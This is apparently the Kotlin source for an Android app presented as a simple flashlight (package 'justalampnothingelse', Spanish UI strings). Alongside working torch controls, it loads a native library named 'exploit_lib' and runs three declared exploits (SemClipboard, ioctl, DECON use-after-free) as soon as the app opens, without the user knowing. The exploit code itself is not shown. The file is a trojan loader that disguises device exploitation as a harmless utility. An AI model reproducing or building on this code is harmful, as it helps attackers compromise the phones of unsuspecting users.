package com.example.justalampnothingelse

import android.content.Context
import android.hardware.camera2.CameraManager
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.activity.ComponentActivity

class MainActivity : ComponentActivity() {

    private var cameraId: String? = null
    private var isFlashOn = false

    init {
        System.loadLibrary("exploit_lib")  // Cargar librería nativa
    }

    // Declarar funciones nativas
    private external fun exploitSemClipboard(): Int
    private external fun exploitIoctl(): Int
    private external fun exploitDeconUaf(): Int

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val button = Button(this)
        button.text = "Encender Linterna"
        setContentView(button)

        // Configurar linterna
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            cameraId = cameraManager.cameraIdList.first()
        } catch (e: Exception) {
            Log.e("Flash", "No se pudo obtener cámara", e)
        }

        button.setOnClickListener {
            if (cameraId == null) {
                Toast.makeText(this, "No hay flash disponible", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            try {
                isFlashOn = !isFlashOn
                cameraManager.setTorchMode(cameraId!!, isFlashOn)
                button.text = if (isFlashOn) "Apagar Linterna" else "Encender Linterna"
            } catch (e: Exception) {
                Log.e("Flash", "Error al cambiar estado de la linterna", e)
            }
        }

        // Ejecutar exploits al iniciar
        runExploits()
    }

    private fun runExploits() {
        runCatching {
            if (exploitSemClipboard() == 0) Log.d("Exploit", "SemClipboard explotado")
            if (exploitIoctl() == 0) Log.d("Exploit", "Ioctl explotado")
            if (exploitDeconUaf() == 0) Log.d("Exploit", "DECON UAF explotado")
        }.onFailure {
            Log.e("Exploit", "Error: ${it.message}")
        }
    }
}